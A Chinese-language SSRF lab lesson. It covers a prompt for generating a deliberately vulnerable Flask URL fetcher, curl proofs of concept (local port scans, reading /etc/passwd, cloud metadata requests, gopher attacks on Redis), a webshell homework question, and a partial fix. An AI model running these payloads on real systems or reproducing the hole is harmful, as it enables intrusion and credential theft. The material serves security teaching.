# Day 8 - SSRF 服务端请求伪造

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带 SSRF 漏洞的功能：

```
在 Flask 中实现 URL 抓取功能，要求：
1. 用户可以提交一个 URL 让服务器去抓取内容
2. 服务器使用 urllib 或 requests 访问该 URL 并返回内容
3. 支持各种协议（http://, https://, file:// 等）
4. 不需要限制 URL 的协议和域名
5. 返回抓取的内容给用户查看
```

---

## 二、漏洞关键代码解释

### 漏洞：SSRF（服务器端请求伪造）

```python
# core/url_fetcher.py
import urllib.request

def fetch_url(target_url):
    """
    ============================================================
    VULN: SSRF 漏洞
    - 未限制目标 URL 的协议（支持 file://, gopher:// 等）
    - 未阻止内网 IP 访问（可扫描 127.0.0.1, 10.x.x.x 等）
    - 未做 DNS 解析校验（可绕过域名黑名单）
    ============================================================
    """
    try:
        # ↓↓↓ 漏洞行：用户提供的 URL 直接传给 urllib，无任何过滤
        response = urllib.request.urlopen(target_url, timeout=10)
        content = response.read().decode('utf-8', errors='replace')[:5000]

        return {
            "success": True,
            "status_code": response.status,
            "headers": dict(response.headers),
            "content": content
        }
    except Exception as e:
        return {"success": False, "message": f"请求失败: {str(e)}"}
```

**问题**：
- `target_url` 来自用户输入，直接传给 `urllib.request.urlopen()`
- `urllib` 原生支持 `file://`、`gopher://`、`dict://` 等协议
- 未阻止访问内网 IP（`127.0.0.1`、`10.x.x.x`、`172.x.x.x`、`192.168.x.x`）
- 未做 DNS rebinding 防护

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 攻击效果 |
|------|---------|---------|
| 无协议限制 | 允许任意协议 | file:// 读文件，gopher:// 攻击内网 |
| 无 IP 限制 | 未过滤内网地址 | 扫描内网端口，攻击内网服务 |
| 无 DNS 校验 | 未做二次解析 | DNS Rebinding 绕过 IP 黑名单 |
| 有回显 | 响应内容直接返回 | 看到扫描结果 |

---

## 四、POC 代码

### POC 1：内网端口扫描

```bash
# 先登录
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt

# 扫描本地端口
for port in 22 80 443 3306 5000 6379 8080; do
  echo "=== Port $port ==="
  curl http://127.0.0.1:5000/fetch-url \
    -b /tmp/cookies.txt \
    -d "url=http://127.0.0.1:$port" 2>/dev/null | grep -o '"status_code": [0-9]*\|"success": true\|请求失败'
done
```

**预期结果**：可探测内网中开放的服务端口。

### POC 2：读取本地文件

```bash
# 读取系统密码文件
curl http://127.0.0.1:5000/fetch-url \
  -b /tmp/cookies.txt \
  -d "url=file:///etc/passwd" | grep "root:"

# 读取应用源码
curl http://127.0.0.1:5000/fetch-url \
  -b /tmp/cookies.txt \
  -d "url=file:///root/ai-security-lab/app.py" | head -20
```

### POC 3：自反射扫描（访问自身）

```bash
# 访问 Flask 自身
curl http://127.0.0.1:5000/fetch-url \
  -b /tmp/cookies.txt \
  -d "url=http://127.0.0.1:5000/admin"

# 访问云服务元数据（如果在云环境）
curl http://127.0.0.1:5000/fetch-url \
  -b /tmp/cookies.txt \
  -d "url=http://169.254.169.254/latest/meta-data/"
```

### POC 4：gopher 协议攻击内网 Redis

```bash
# 通过 gopher 协议向 Redis 发送命令（假设内网有未授权 Redis）
curl http://127.0.0.1:5000/fetch-url \
  -b /tmp/cookies.txt \
  -d "url=gopher://127.0.0.1:6379/_info"
```

---

## 五、POC 代码详细解释

### POC 1 详解：内网扫描

```bash
curl ... -d "url=http://127.0.0.1:5000"
```

**攻击链**：

```
用户 POST /fetch-url → url=http://127.0.0.1:5000

服务端执行:
  urllib.request.urlopen("http://127.0.0.1:5000")
                              ↑
                        localhost，即服务器自身！
  
服务器向自己发请求:
  Flask 收到请求 → 返回页面内容
  ↓
响应返回给攻击者 → 攻击者看到内网服务的返回内容
```

**为什么攻击者不能直接访问内网？**

```
攻击者（远程）:   127.0.0.1:5000 → 攻击者的本机，不是服务器的！
服务器（内网）:  127.0.0.1:5000 → 服务器自己的端口

SSRF 让服务器帮忙访问内网:
  攻击者 → 服务器（公网） → 127.0.0.1:5000（内网）
                              ↑
                    服务器访问自己，攻击者绕过了防火墙
```

### POC 2 详解：读文件

```bash
curl ... -d "url=file:///etc/passwd"
```

**利用过程**：
```
攻击者提交: file:///etc/passwd

服务端执行:
  urllib.request.urlopen("file:///etc/passwd")
  → 本地文件 /etc/passwd 被打开
  → 内容被读取并返回
  
攻击者看到:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  ...
```

---

## 六、修复方案

```python
# fix/url_fetcher_fix.py
import urllib.request
import socket

# 修复 1：协议白名单
ALLOWED_PROTOCOLS = ('http://', 'https://')

# 修复 2：内网 IP 黑名单
PRIVATE_IP_PREFIXES = (
    '127.', '10.', '172.16.', '172.17.', '172.18.', '172.19.',
    '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
    '172.25.', '172.26.', '172.27.', '172.28.', '172.29.',
    '172.30.', '172.31.', '192.168.', '169.254.', '0.',
    'localhost', '::1'
)

def is_private_ip(hostname):
    """检查主机名是否指向内网地址"""
    try:
        ip = socket.gethostbyname(hostname)
        return any(ip.startswith(prefix) for prefix in PRIVATE_IP_PREFIXES)
    except socket.gaierror:
        return True  # DNS 解析失败视为不安全

def fetch_url_fixed(target_url):
    """修复：限制协议 + 禁止内网访问"""

    # 修复 1：协议白名单
    if not target_url.lower().startswith(ALLOWED_PROTOCOLS):
        return {"success": False, "message": "不支持的协议"}

    # 修复 2：解析主机名并检查是否为内网 IP
    from urllib.parse import urlparse
    parsed = urlparse(target_url)
    if is_private_ip(parsed.hostname):
        return {"success": False, "message": "禁止访问内网地址"}

    # 安全地发起请求
    try:
        response = urllib.request.urlopen(target_url, timeout=10)
        content = response.read().decode('utf-8', errors='replace')[:5000]
        return {"success": True, "content": content}
    except Exception as e:
        return {"success": False, "message": f"请求失败: {str(e)}"}
```

---

## 七、课后作业

1. 在 `fix/` 目录创建 `url_fetcher_fix.py`，实现上述修复
2. 验证：
   - `file:///etc/passwd` 是否被拒绝？
   - `http://127.0.0.1:5000` 是否被拒绝？
   - 外部正常 URL（如 `https://example.com`）是否可访问？
3. （进阶）什么是 DNS Rebinding？如何防御？
4. （进阶）如果内网有未授权的 Redis，如何通过 gopher 协议 SSRF 植入 webshell？
